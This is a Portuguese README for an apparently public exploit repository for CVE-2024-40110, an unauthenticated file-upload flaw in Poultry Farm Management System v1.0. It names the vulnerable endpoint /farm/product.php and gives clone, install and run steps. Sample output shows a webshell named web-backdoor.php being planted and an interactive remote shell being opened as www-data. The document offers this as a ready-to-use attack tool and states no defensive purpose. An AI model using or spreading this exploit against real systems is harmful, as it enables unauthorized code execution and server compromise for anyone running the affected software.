# CVE-2024-40110 - Poultry Farm Management System v1.0 - Remote Code Execution (RCE)

Exploit para a vulnerabilidade **CVE-2024-40110**, que permite **execução remota de comandos (RCE)** sem autenticação no **Poultry Farm Management System v1.0**.  
Esse exploit realiza o upload de uma webshell via endpoint vulnerável e fornece uma shell interativa para execução de comandos.

---

## 📌 Informações Técnicas

- **Produto vulnerável**: Poultry Farm Management System v1.0
- **Vulnerabilidade**: Upload de arquivo não autenticado → Execução remota de código
- **CVE**: [CVE-2024-40110](https://nvd.nist.gov/vuln/detail/CVE-2024-40110)
- **Endpoint vulnerável**: `/farm/product.php`
- **Autor original**: Jerry Thomas (w3bn00b3r)
- **Modificado por**: [shacrony](https://github.com/shacrony)

---

## ⚙️ Instalação

Clone este repositório:

```bash
git clone https://github.com/shacrony/redcock.py.git
cd redcock.py

python3 -m venv venv
source venv/bin/activate

pip install -r requirements.txt


Como usar:

Execute o script:

python3 redcock.py
E preencha as informações quando solicitado:

Alvo (ex: http://10.10.10.10): http://10.10.247.190
Diretório do sistema (ex: /farm): /farm
Exemplo:

[*] Enviando webshell para: http://10.10.247.190/farm/product.php
[+] Webshell enviada com sucesso!
[+] Shell URL: http://10.10.247.190/farm/assets/img/productimages/web-backdoor.php

[!] Conectado à shell remota. Digite seus comandos abaixo.
[!] Digite 'exit' para sair.

shell$ whoami
www-data
